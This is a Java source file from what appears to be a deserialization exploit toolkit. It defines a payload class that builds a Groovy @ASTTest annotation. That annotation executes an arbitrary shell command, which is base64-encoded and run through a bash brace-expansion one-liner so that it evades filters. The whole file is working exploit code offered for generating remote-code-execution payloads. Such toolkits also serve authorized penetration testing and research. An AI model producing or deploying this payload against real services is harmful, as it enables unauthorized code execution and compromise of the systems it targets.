package payloads.deserial;

import com.dimas.Command;
import com.dimas.Gadget;

import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import payloads.face.ObjectPayload;
import util.PayloadRunner;

@Authors({"Dimas"})
@Dependencies({"This is example of deserialization payload"})
public class Example extends PayloadRunner implements ObjectPayload<Gadget> {

    public Gadget getObject(final String command) throws Exception {
        String base64Command = new String(java.util.Base64.getEncoder().encode(command.getBytes()));
        String payload = "@groovy.transform.ASTTest(value={\r\n" +
        "    assert java.lang.Runtime.getRuntime().exec(\"bash -c {echo,"+base64Command+"}|{base64,-d}|{bash,-i}\")\r\n" +
        "})\r\n" +
        "def x\r\n" +
        "";
        Gadget gadget = new Gadget(new Command(payload));
        return gadget;
    }

    public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(Example.class, command, fusion);
    }
}
